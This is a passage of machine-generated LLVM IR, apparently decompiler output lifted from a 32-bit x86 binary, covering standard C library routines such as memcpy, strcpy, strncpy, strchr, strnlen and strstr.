  %v6_8052862 = call i32 @__stdio_trans2w_o(i16* %v1_805284b, i32 128, i32 %v0_805285a, i32 %v0_805285a)
  %v1_805286a = icmp eq i32 %v6_8052862, 0
  %v1_805286c = icmp eq i1 %v1_805286a, false
  br i1 %v1_805286c, label %dec_label_pc_80528aa, label %dec_label_pc_805286e

dec_label_pc_805286e:                             ; preds = %dec_label_pc_805285a, %entry
  %v2_805286e = icmp eq i32 %v4_8052843, 0
  br i1 %v2_805286e, label %dec_label_pc_80528aa, label %dec_label_pc_8052872

dec_label_pc_8052872:                             ; preds = %dec_label_pc_805286e
  %v1_8052872 = icmp eq i32 %arg3, 0
  br i1 %v1_8052872, label %dec_label_pc_80528aa, label %dec_label_pc_8052876

dec_label_pc_8052876:                             ; preds = %dec_label_pc_8052872
  %v9_805287b = udiv i64 4294967295, %arg2
  %v10_805287b = trunc i64 %v9_805287b to i32
  %v6_805287f = icmp ult i32 %v10_805287b, %arg3
  br i1 %v6_805287f, label %dec_label_pc_805289b, label %dec_label_pc_8052881

dec_label_pc_8052881:                             ; preds = %dec_label_pc_8052876
  %sext = mul i64 %arg2, 4294967296
  %v2_8052884 = sdiv i64 %sext, 4294967296
  %v3_8052884 = sext i32 %arg3 to i64
  %v4_8052884 = mul nsw i64 %v3_8052884, %v2_8052884
  %v5_8052884 = trunc i64 %v4_8052884 to i32
  %v0_8052887 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_805288d = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_8052884, i32 %v0_8052887, i32 %v10_805287b)
  %v6_805288d = sext i32 %v5_805288d to i64
  %v10_8052894 = udiv i64 %v6_805288d, %arg2
  %v11_8052894 = trunc i64 %v10_8052894 to i32
  br label %dec_label_pc_80528ac

dec_label_pc_805289b:                             ; preds = %dec_label_pc_8052876
  %v0_805289b = load i32, i32* @ebx, align 4
  %v1_805289b = inttoptr i32 %v0_805289b to i16*
  %v2_805289b = load i16, i16* %v1_805289b, align 2
  %v3_805289b = or i16 %v2_805289b, 8
  store i16 %v3_805289b, i16* %v1_805289b, align 2
  %v0_805289f = load i32, i32* %stack_var_-28, align 4
  %v1_805289f = call i32 @__errno_location(i32 %v0_805289f)
  %v1_80528a4 = inttoptr i32 %v1_805289f to i32*
  store i32 22, i32* %v1_80528a4, align 4
  br label %dec_label_pc_80528aa

dec_label_pc_80528aa:                             ; preds = %dec_label_pc_8052872, %dec_label_pc_805286e, %dec_label_pc_805285a, %dec_label_pc_805289b
  br label %dec_label_pc_80528ac

dec_label_pc_80528ac:                             ; preds = %dec_label_pc_8052881, %dec_label_pc_80528aa
  %v0_80528af = phi i32 [ %v11_8052894, %dec_label_pc_8052881 ], [ 0, %dec_label_pc_80528aa ]
  store i32 %v0_805283d, i32* @esi, align 4
  store i32 %v0_805283c, i32* @edi, align 4
  ret i32 %v0_80528af

; uselistorder directives
  uselistorder i32 %v0_805285a, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80528ac, { 1, 0 }
  uselistorder label %dec_label_pc_80528aa, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80528b1 = load i32, i32* @esi, align 4
  store i32 %v0_80528b1, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_80528b2 = sdiv i32 %sext, 16777216
  store i32 %v4_80528b2, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80528bc = ptrtoint i16* %arg1 to i32
  store i32 %v4_80528bc, i32* %edi.global-to-local, align 4
  %v2_80528c0 = udiv i32 %v4_80528b2, 4
  %v3_80528c3 = inttoptr i32 %arg2 to i8*
  %v4_80528c3 = bitcast i16* %arg1 to i8*
  %v5_80528c3 = call i8* @_memcpy(i8* %v4_80528c3, i8* %v3_80528c3, i32 %v2_80528c0)
  %v6_80528c3 = ptrtoint i8* %v5_80528c3 to i32
  store i32 %v6_80528c3, i32* @ecx, align 4
  %v0_80528c5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80528c5 = and i32 %v0_80528c5, 2
  %v3_80528c5 = icmp eq i32 %v2_80528c5, 0
  br i1 %v3_80528c5, label %dec_label_pc_80528cb, label %dec_label_pc_80528c9

dec_label_pc_80528c9:                             ; preds = %entry
  %v0_80528c9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80528c9 = inttoptr i32 %v0_80528c9 to i16*
  %v2_80528c9 = load i16, i16* %v1_80528c9, align 2
  %v3_80528c9 = load i32, i32* %edi.global-to-local, align 4
  %v4_80528c9 = inttoptr i32 %v3_80528c9 to i16*
  store i16 %v2_80528c9, i16* %v4_80528c9, align 2
  %v5_80528c9 = load i32, i32* %edi.global-to-local, align 4
  %v6_80528c9 = load i32, i32* %esi.global-to-local, align 4
  %v7_80528c9 = load i1, i1* @df, align 1
  %v8_80528c9 = select i1 %v7_80528c9, i32 -2, i32 2
  %v9_80528c9 = add i32 %v8_80528c9, %v5_80528c9
  %v10_80528c9 = add i32 %v8_80528c9, %v6_80528c9
  store i32 %v9_80528c9, i32* %edi.global-to-local, align 4
  store i32 %v10_80528c9, i32* %esi.global-to-local, align 4
  %v0_80528cb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80528cb

dec_label_pc_80528cb:                             ; preds = %entry, %dec_label_pc_80528c9
  %v0_80528cb = phi i32 [ %v0_80528c5, %entry ], [ %v0_80528cb.pre, %dec_label_pc_80528c9 ]
  %v2_80528cb = urem i32 %v0_80528cb, 2
  %v3_80528cb = icmp eq i32 %v2_80528cb, 0
  br i1 %v3_80528cb, label %dec_label_pc_80528d0, label %dec_label_pc_80528cf

dec_label_pc_80528cf:                             ; preds = %dec_label_pc_80528cb
  %v0_80528cf = load i32, i32* %esi.global-to-local, align 4
  %v1_80528cf = inttoptr i32 %v0_80528cf to i8*
  %v2_80528cf = load i8, i8* %v1_80528cf, align 1
  %v3_80528cf = load i32, i32* %edi.global-to-local, align 4
  %v4_80528cf = inttoptr i32 %v3_80528cf to i8*
  store i8 %v2_80528cf, i8* %v4_80528cf, align 1
  %v5_80528cf = load i32, i32* %edi.global-to-local, align 4
  %v6_80528cf = load i32, i32* %esi.global-to-local, align 4
  %v7_80528cf = load i1, i1* @df, align 1
  %v8_80528cf = select i1 %v7_80528cf, i32 -1, i32 1
  %v9_80528cf = add i32 %v8_80528cf, %v5_80528cf
  %v10_80528cf = add i32 %v8_80528cf, %v6_80528cf
  store i32 %v9_80528cf, i32* %edi.global-to-local, align 4
  store i32 %v10_80528cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80528d0

dec_label_pc_80528d0:                             ; preds = %dec_label_pc_80528cb, %dec_label_pc_80528cf
  store i32 %v4_80528bc, i32* %eax.global-to-local, align 4
  %v2_80528d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80528d4, i32* @esi, align 4
  ret i32 %v4_80528bc

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_80528d0, { 1, 0 }
  uselistorder label %dec_label_pc_80528cb, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_80528d8 = load i32, i32* @edi, align 4
  %v4_80528e1 = ptrtoint i8* %arg1 to i32
  %v5_80528e5 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_80528e5 = ptrtoint i8* %v5_80528e5 to i32
  store i32 %v6_80528e5, i32* @ecx, align 4
  store i32 %v0_80528d8, i32* @edi, align 4
  ret i32 %v4_80528e1

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80528f1 = ptrtoint i8* %arg1 to i32
  %v2_80528f9 = mul i32 %arg2, 256
  %v3_80528f9 = and i32 %v2_80528f9, 65280
  %v4_80528f9 = and i32 %arg2, -65281
  %v5_80528f9 = or i32 %v3_80528f9, %v4_80528f9
  %v8_80528fb.pre = load i1, i1* @df, align 1
  %v9_80528fb = select i1 %v8_80528fb.pre, i32 -1, i32 1
  br label %dec_label_pc_80528fb

dec_label_pc_80528fb:                             ; preds = %dec_label_pc_8052900, %entry
  %v4_80528fb = phi i32 [ %v6_80528fb, %dec_label_pc_8052900 ], [ %v5_80528f9, %entry ]
  %v7_80528fb = phi i32 [ %v10_80528fb, %dec_label_pc_8052900 ], [ %v4_80528f1, %entry ]
  %v1_80528fb = inttoptr i32 %v7_80528fb to i8*
  %v2_80528fb = load i8, i8* %v1_80528fb, align 1
  %v10_80528fb = add i32 %v7_80528fb, %v9_80528fb
  %v3_80528fc = udiv i32 %v4_80528fb, 256
  %v4_80528fc = trunc i32 %v3_80528fc to i8
  %v16_80528fc = icmp eq i8 %v2_80528fb, %v4_80528fc
  br i1 %v16_80528fc, label %dec_label_pc_8052909.loopexit, label %dec_label_pc_8052900

dec_label_pc_8052900:                             ; preds = %dec_label_pc_80528fb
  %v3_80528fb = zext i8 %v2_80528fb to i32
  %v5_80528fb = and i32 %v4_80528fb, -256
  %v6_80528fb = or i32 %v3_80528fb, %v5_80528fb
  %v4_8052900 = icmp eq i8 %v2_80528fb, 0
  %v1_8052902 = icmp eq i1 %v4_8052900, false
  br i1 %v1_8052902, label %dec_label_pc_80528fb, label %dec_label_pc_8052904

dec_label_pc_8052904:                             ; preds = %dec_label_pc_8052900
  br label %dec_label_pc_8052909

dec_label_pc_8052909.loopexit:                    ; preds = %dec_label_pc_80528fb
  %phitmp = add i32 %v10_80528fb, -1
  br label %dec_label_pc_8052909

dec_label_pc_8052909:                             ; preds = %dec_label_pc_8052909.loopexit, %dec_label_pc_8052904
  %v0_8052909 = phi i32 [ 0, %dec_label_pc_8052904 ], [ %phitmp, %dec_label_pc_8052909.loopexit ]
  ret i32 %v0_8052909

; uselistorder directives
  uselistorder i8 %v2_80528fb, { 1, 2, 0 }
  uselistorder i32 %v4_80528fb, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052911 = load i32, i32* @esi, align 4
  store i32 %v0_8052911, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052919 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052919, i32* %edi.global-to-local, align 4
  %v4_805291d.pre = load i32, i32* @eax, align 4
  %v8_805291d.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_805291d

dec_label_pc_805291d:                             ; preds = %dec_label_pc_805291d.dec_label_pc_805291d_crit_edge, %entry
  %v2_805291e = phi i32 [ %v7_805291e, %dec_label_pc_805291d.dec_label_pc_805291d_crit_edge ], [ %v4_8052919, %entry ]
  %v8_805291d = phi i1 [ %v5_805291e, %dec_label_pc_805291d.dec_label_pc_805291d_crit_edge ], [ %v8_805291d.pre, %entry ]
  %v4_805291d = phi i32 [ %v0_805291f, %dec_label_pc_805291d.dec_label_pc_805291d_crit_edge ], [ %v4_805291d.pre, %entry ]
  %v7_805291d = phi i32 [ %v0_805291d.pre, %dec_label_pc_805291d.dec_label_pc_805291d_crit_edge ], [ %arg2, %entry ]
  %v1_805291d = inttoptr i32 %v7_805291d to i8*
  %v2_805291d = load i8, i8* %v1_805291d, align 1
  %v3_805291d = zext i8 %v2_805291d to i32
  %v5_805291d = and i32 %v4_805291d, -256
  %v6_805291d = or i32 %v3_805291d, %v5_805291d
  store i32 %v6_805291d, i32* %eax.global-to-local, align 4
  %v9_805291d = select i1 %v8_805291d, i32 -1, i32 1
  %v10_805291d = add i32 %v7_805291d, %v9_805291d
  store i32 %v10_805291d, i32* %esi.global-to-local, align 4
  %v3_805291e = inttoptr i32 %v2_805291e to i8*
  store i8 %v2_805291d, i8* %v3_805291e, align 1
  %v4_805291e = load i32, i32* %edi.global-to-local, align 4
  %v5_805291e = load i1, i1* @df, align 1
  %v6_805291e = select i1 %v5_805291e, i32 -1, i32 1
  %v7_805291e = add i32 %v6_805291e, %v4_805291e
  store i32 %v7_805291e, i32* %edi.global-to-local, align 4
  %v0_805291f = load i32, i32* %eax.global-to-local, align 4
  %v3_805291f = trunc i32 %v0_805291f to i8
  %v4_805291f = icmp eq i8 %v3_805291f, 0
  %v1_8052921 = icmp eq i1 %v4_805291f, false
  br i1 %v1_8052921, label %dec_label_pc_805291d.dec_label_pc_805291d_crit_edge, label %dec_label_pc_8052923

dec_label_pc_805291d.dec_label_pc_805291d_crit_edge: ; preds = %dec_label_pc_805291d
  %v0_805291d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805291d

dec_label_pc_8052923:                             ; preds = %dec_label_pc_805291d
  store i32 %v4_8052919, i32* %eax.global-to-local, align 4
  %v2_8052927 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052927, i32* @edx, align 4
  %v2_8052928 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052928, i32* @esi, align 4
  ret i32 %v4_8052919

; uselistorder directives
  uselistorder i32 %v0_805291f, { 1, 0 }
  uselistorder i32 %v7_805291e, { 1, 0 }
  uselistorder i1 %v5_805291e, { 1, 0 }
  uselistorder i32 %v4_8052919, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052941 = load i32, i32* @esi, align 4
  store i32 %v0_8052941, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805294d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805294d, i32* %edi.global-to-local, align 4
  %v1_8052951 = add i32 %arg3, 1
  store i32 %v1_8052951, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052952

dec_label_pc_8052952:                             ; preds = %dec_label_pc_8052955, %entry
  %v3_8052956 = phi i32 [ %v4_805294d, %entry ], [ %v8_8052956, %dec_label_pc_8052955 ]
  %v0_8052952 = phi i32 [ %v1_8052951, %entry ], [ %v0_8052952.pre, %dec_label_pc_8052955 ]
  %v1_8052952 = add i32 %v0_8052952, -1
  %v8_8052952 = icmp eq i32 %v1_8052952, 0
  store i32 %v1_8052952, i32* %ecx.global-to-local, align 4
  br i1 %v8_8052952, label %.loopexit, label %dec_label_pc_8052955

dec_label_pc_8052955:                             ; preds = %dec_label_pc_8052952
  %v0_8052955 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052955 = inttoptr i32 %v0_8052955 to i8*
  %v2_8052955 = load i8, i8* %v1_8052955, align 1
  %v10_8052955 = load i1, i1* @df, align 1
  %v11_8052955 = select i1 %v10_8052955, i32 -1, i32 1
  %v12_8052955 = add i32 %v11_8052955, %v0_8052955
  store i32 %v12_8052955, i32* %esi.global-to-local, align 4
  %v4_8052956 = inttoptr i32 %v3_8052956 to i8*
  store i8 %v2_8052955, i8* %v4_8052956, align 1
  %v5_8052956 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052956 = load i1, i1* @df, align 1
  %v7_8052956 = select i1 %v6_8052956, i32 -1, i32 1
  %v8_8052956 = add i32 %v7_8052956, %v5_8052956
  store i32 %v8_8052956, i32* %edi.global-to-local, align 4
  %v6_8052957 = icmp eq i8 %v2_8052955, 0
  %v1_8052959 = icmp eq i1 %v6_8052957, false
  %v0_8052952.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_8052959, label %dec_label_pc_8052952, label %dec_label_pc_805295b

dec_label_pc_805295b:                             ; preds = %dec_label_pc_8052955
  %v1_805295b = add i32 %v0_8052952.pre, -1
  store i32 %v1_805295b, i32* %ecx.global-to-local, align 4
  %v2_805295c = sext i8 %v2_8052955 to i32
  %v4_805295c = inttoptr i32 %v8_8052956 to i8*
  %v5_805295c = call i8* @_memset(i8* %v4_805295c, i32 %v2_805295c, i32 %v1_805295b)
  %v6_805295c = ptrtoint i8* %v5_805295c to i32
  store i32 %v6_805295c, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_8052952, %dec_label_pc_805295b
  %v2_8052962 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052962, i32* @edx, align 4
  %v2_8052963 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052963, i32* @esi, align 4
  ret i32 %v4_805294d

; uselistorder directives
  uselistorder i32 %v8_8052956, { 0, 2, 1 }
  uselistorder i8 %v2_8052955, { 0, 2, 1 }
  uselistorder i32 %v1_8052952, { 1, 0 }
  uselistorder i32 %v4_805294d, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_8052968 = ptrtoint i8* %tmp4 to i32
  %v8_805297b5 = icmp eq i32 %tmp, 0
  %v1_805297c6 = icmp eq i1 %v8_805297b5, false
  br i1 %v1_805297c6, label %dec_label_pc_8052975, label %dec_label_pc_805297e

dec_label_pc_8052975:                             ; preds = %entry, %dec_label_pc_805297a
  %v1_805297b8 = phi i32 [ %v1_805297b, %dec_label_pc_805297a ], [ %tmp, %entry ]
  %v0_805297e7 = phi i32 [ %v1_805297a, %dec_label_pc_805297a ], [ %v4_8052968, %entry ]
  %v1_8052975 = inttoptr i32 %v0_805297e7 to i8*
  %v2_8052975 = load i8, i8* %v1_8052975, align 1
  %v3_8052975 = icmp eq i8 %v2_8052975, 0
  br i1 %v3_8052975, label %dec_label_pc_805297e, label %dec_label_pc_805297a

dec_label_pc_805297a:                             ; preds = %dec_label_pc_8052975
  %v1_805297a = add i32 %v0_805297e7, 1
  %v1_805297b = add i32 %v1_805297b8, -1
  %v8_805297b = icmp eq i32 %v1_805297b, 0
  %v1_805297c = icmp eq i1 %v8_805297b, false
  br i1 %v1_805297c, label %dec_label_pc_8052975, label %dec_label_pc_805297e

dec_label_pc_805297e:                             ; preds = %dec_label_pc_805297a, %dec_label_pc_8052975, %entry
  %v0_805297e.lcssa = phi i32 [ %v4_8052968, %entry ], [ %v0_805297e7, %dec_label_pc_8052975 ], [ %v1_805297a, %dec_label_pc_805297a ]
  %v2_805297e = sub i32 %v0_805297e.lcssa, %v4_8052968
  ret i32 %v2_805297e

; uselistorder directives
  uselistorder i32 %v1_805297b, { 1, 0 }
  uselistorder i32 %v0_805297e7, { 0, 2, 1 }
  uselistorder i32 %v4_8052968, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052975, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_8052987 = load i32, i32* @ebx, align 4
  %v4_805298b = ptrtoint i8* %arg2 to i32
  %v2_8052993 = load i8, i8* %arg2, align 1
  %v1_8052996 = icmp eq i8 %v2_8052993, 0
  br i1 %v1_8052996, label %dec_label_pc_8052a43, label %dec_label_pc_805299e

dec_label_pc_805299e:                             ; preds = %entry
  %v1_805299e = add i32 %arg1, -1
  br label %dec_label_pc_805299f

dec_label_pc_805299f:                             ; preds = %dec_label_pc_80529ab, %dec_label_pc_805299e
  %v0_805299f = phi i32 [ %v1_805299f, %dec_label_pc_80529ab ], [ %v1_805299e, %dec_label_pc_805299e ]
  %v1_805299f = add i32 %v0_805299f, 1
  %v1_80529a0 = inttoptr i32 %v1_805299f to i8*
  %v2_80529a0 = load i8, i8* %v1_80529a0, align 1
  %v1_80529a3 = icmp eq i8 %v2_80529a0, 0
  br i1 %v1_80529a3, label %dec_label_pc_8052a41, label %dec_label_pc_80529ab

dec_label_pc_80529ab:                             ; preds = %dec_label_pc_805299f
  %v12_80529ab = icmp eq i8 %v2_80529a0, %v2_8052993
  %v1_80529ad = icmp eq i1 %v12_80529ab, false
  br i1 %v1_80529ad, label %dec_label_pc_805299f, label %dec_label_pc_80529af

dec_label_pc_80529af:                             ; preds = %dec_label_pc_80529ab
  %v1_80529af = add i32 %v4_805298b, 1
  %v2_80529b6 = inttoptr i32 %v1_80529af to i8*
  %v3_80529b6 = load i8, i8* %v2_80529b6, align 1
  %v1_80529bd = icmp eq i8 %v3_80529b6, 0
  br i1 %v1_80529bd, label %dec_label_pc_8052a43, label %dec_label_pc_80529c1

dec_label_pc_80529c1:                             ; preds = %dec_label_pc_80529af
  %v1_80529c1 = add i32 %v0_805299f, 2
  %v1_8052a02 = add i32 %v4_805298b, 2
  %v2_8052a02 = inttoptr i32 %v1_8052a02 to i8*
  br label %dec_label_pc_80529f4

dec_label_pc_80529cc:                             ; preds = %dec_label_pc_8052a39
  %v2_80529cc = inttoptr i32 %v0_8052a07 to i8*
  %v3_80529cc = load i8, i8* %v2_80529cc, align 1
  br label %dec_label_pc_80529e9.preheader

dec_label_pc_80529e9.preheader:                   ; preds = %dec_label_pc_80529cc, %dec_label_pc_80529f4
  %v0_80529d5.ph.in = phi i8 [ %v0_80529e927.in, %dec_label_pc_80529f4 ], [ %v3_80529cc, %dec_label_pc_80529cc ]
  %v12_80529e954 = icmp eq i8 %v0_80529d5.ph.in, %v2_8052993
  %v1_80529eb55 = icmp eq i1 %v12_80529e954, false
  br i1 %v1_80529eb55, label %dec_label_pc_80529d5, label %dec_label_pc_80529ed

dec_label_pc_80529d5:                             ; preds = %dec_label_pc_80529e9.preheader, %dec_label_pc_80529e5
  %v0_80529d557.in = phi i8 [ %v2_80529e6, %dec_label_pc_80529e5 ], [ %v0_80529d5.ph.in, %dec_label_pc_80529e9.preheader ]
  %v0_80529d956 = phi i32 [ %v1_80529e5, %dec_label_pc_80529e5 ], [ %v0_8052a07, %dec_label_pc_80529e9.preheader ]
  %v1_80529d5 = icmp eq i8 %v0_80529d557.in, 0
  br i1 %v1_80529d5, label %dec_label_pc_8052a41, label %dec_label_pc_80529d9

dec_label_pc_80529d9:                             ; preds = %dec_label_pc_80529d5
  %v1_80529d9 = add i32 %v0_80529d956, 1
  %v1_80529da = inttoptr i32 %v1_80529d9 to i8*
  %v2_80529da = load i8, i8* %v1_80529da, align 1
  %v12_80529dd = icmp eq i8 %v2_80529da, %v2_8052993
  br i1 %v12_80529dd, label %dec_label_pc_80529ed, label %dec_label_pc_80529e1

dec_label_pc_80529e1:                             ; preds = %dec_label_pc_80529d9
  %v1_80529e1 = icmp eq i8 %v2_80529da, 0
  br i1 %v1_80529e1, label %dec_label_pc_8052a41, label %dec_label_pc_80529e5

dec_label_pc_80529e5:                             ; preds = %dec_label_pc_80529e1
  %v1_80529e5 = add i32 %v0_80529d956, 2
  %v1_80529e6 = inttoptr i32 %v1_80529e5 to i8*
  %v2_80529e6 = load i8, i8* %v1_80529e6, align 1
  %v12_80529e9 = icmp eq i8 %v2_80529e6, %v2_8052993
  %v1_80529eb = icmp eq i1 %v12_80529e9, false
  br i1 %v1_80529eb, label %dec_label_pc_80529d5, label %dec_label_pc_80529ed

dec_label_pc_80529ed:                             ; preds = %dec_label_pc_80529e5, %dec_label_pc_80529d9, %dec_label_pc_80529e9.preheader
  %v0_80529ed = phi i32 [ %v0_8052a07, %dec_label_pc_80529e9.preheader ], [ %v1_80529d9, %dec_label_pc_80529d9 ], [ %v1_80529e5, %dec_label_pc_80529e5 ]
  %v1_80529ed = add i32 %v0_80529ed, 1
  br label %dec_label_pc_80529f4

dec_label_pc_80529f4:                             ; preds = %dec_label_pc_80529c1, %dec_label_pc_80529ed
  %v0_80529e927.in.in.in = phi i32 [ %v1_80529ed, %dec_label_pc_80529ed ], [ %v1_80529c1, %dec_label_pc_80529c1 ]
  %v0_8052a07 = phi i32 [ %v1_80529ed, %dec_label_pc_80529ed ], [ %v1_80529c1, %dec_label_pc_80529c1 ]
  %v0_80529e927.in.in = inttoptr i32 %v0_80529e927.in.in.in to i8*
  %v0_80529e927.in = load i8, i8* %v0_80529e927.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_80529e927.in, %v3_80529b6
  %v1_80529f4 = icmp eq i1 %storemerge4, false
  br i1 %v1_80529f4, label %dec_label_pc_80529e9.preheader, label %dec_label_pc_80529f6

dec_label_pc_80529f6:                             ; preds = %dec_label_pc_80529f4
  %v1_80529fe = add i32 %v0_8052a07, 1
  %v2_80529fe = inttoptr i32 %v1_80529fe to i8*
  %v3_80529fe = load i8, i8* %v2_80529fe, align 1
  %v3_8052a02 = load i8, i8* %v2_8052a02, align 1
  %v1_8052a0a = add i32 %v0_8052a07, -1
  %v12_8052a0d = icmp eq i8 %v3_80529fe, %v3_8052a02
  %v1_8052a0f = icmp eq i1 %v12_8052a0d, false
  br i1 %v1_8052a0f, label %dec_label_pc_8052a39, label %dec_label_pc_8052a11.preheader

dec_label_pc_8052a11.preheader:                   ; preds = %dec_label_pc_80529f6
  %v1_8052a1110 = icmp eq i8 %v3_80529fe, 0
  br i1 %v1_8052a1110, label %dec_label_pc_8052a43, label %dec_label_pc_8052a15

dec_label_pc_8052a15:                             ; preds = %dec_label_pc_8052a11.preheader, %dec_label_pc_8052a35
  %v0_8052a28 = phi i32 [ %v1_8052a28, %dec_label_pc_8052a35 ], [ %v1_8052a02, %dec_label_pc_8052a11.preheader ]
  %v0_8052a25 = phi i32 [ %v1_8052a25, %dec_label_pc_8052a35 ], [ %v1_80529fe, %dec_label_pc_8052a11.preheader ]
  %v1_8052a15 = add i32 %v0_8052a25, 1
  %v2_8052a15 = inttoptr i32 %v1_8052a15 to i8*
  %v3_8052a15 = load i8, i8* %v2_8052a15, align 1
  %v1_8052a19 = add i32 %v0_8052a28, 1
  %v2_8052a19 = inttoptr i32 %v1_8052a19 to i8*
  %v3_8052a19 = load i8, i8* %v2_8052a19, align 1
  %v12_8052a1d = icmp eq i8 %v3_8052a15, %v3_8052a19
  %v1_8052a1f = icmp eq i1 %v12_8052a1d, false
  br i1 %v1_8052a1f, label %dec_label_pc_8052a39, label %dec_label_pc_8052a21

dec_label_pc_8052a21:                             ; preds = %dec_label_pc_8052a15
  %v1_8052a21 = icmp eq i8 %v3_8052a19, 0
  br i1 %v1_8052a21, label %dec_label_pc_8052a43, label %dec_label_pc_8052a25

dec_label_pc_8052a25:                             ; preds = %dec_label_pc_8052a21
  %v1_8052a25 = add i32 %v0_8052a25, 2
  %v1_8052a28 = add i32 %v0_8052a28, 2
  %v1_8052a2b = inttoptr i32 %v1_8052a25 to i8*
  %v2_8052a2b = load i8, i8* %v1_8052a2b, align 1
  %v1_8052a2e = inttoptr i32 %v1_8052a28 to i8*
  %v2_8052a2e = load i8, i8* %v1_8052a2e, align 1
  %v12_8052a31 = icmp eq i8 %v2_8052a2b, %v2_8052a2e
  %v1_8052a33 = icmp eq i1 %v12_8052a31, false
  br i1 %v1_8052a33, label %dec_label_pc_8052a39, label %dec_label_pc_8052a35

dec_label_pc_8052a35:                             ; preds = %dec_label_pc_8052a25
  %v1_8052a11 = icmp eq i8 %v2_8052a2e, 0
  br i1 %v1_8052a11, label %dec_label_pc_8052a43, label %dec_label_pc_8052a15

dec_label_pc_8052a39:                             ; preds = %dec_label_pc_8052a25, %dec_label_pc_8052a15, %dec_label_pc_80529f6
  %v0_8052a39.in = phi i8 [ %v3_8052a02, %dec_label_pc_80529f6 ], [ %v2_8052a2e, %dec_label_pc_8052a25 ], [ %v3_8052a19, %dec_label_pc_8052a15 ]
  %v1_8052a39 = icmp eq i8 %v0_8052a39.in, 0
  %v1_8052a3b = icmp eq i1 %v1_8052a39, false
  br i1 %v1_8052a3b, label %dec_label_pc_80529cc, label %dec_label_pc_8052a43

dec_label_pc_8052a41:                             ; preds = %dec_label_pc_805299f, %dec_label_pc_80529e1, %dec_label_pc_80529d5
  br label %dec_label_pc_8052a43

dec_label_pc_8052a43:                             ; preds = %dec_label_pc_8052a11.preheader, %dec_label_pc_8052a39, %dec_label_pc_8052a21, %dec_label_pc_8052a35, %entry, %dec_label_pc_80529af, %dec_label_pc_8052a41
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8052a41 ], [ %v1_805299f, %dec_label_pc_80529af ], [ %arg1, %entry ], [ %v1_8052a0a, %dec_label_pc_8052a35 ], [ %v1_8052a0a, %dec_label_pc_8052a21 ], [ %v1_8052a0a, %dec_label_pc_8052a39 ], [ %v1_8052a0a, %dec_label_pc_8052a11.preheader ]
  store i32 %v0_8052987, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_8052a2e, { 0, 2, 1 }
  uselistorder i32 %v1_8052a28, { 1, 0 }
  uselistorder i32 %v1_8052a25, { 1, 0 }
  uselistorder i8 %v3_8052a19, { 0, 2, 1 }
  uselistorder i8 %v3_80529fe, { 1, 0 }
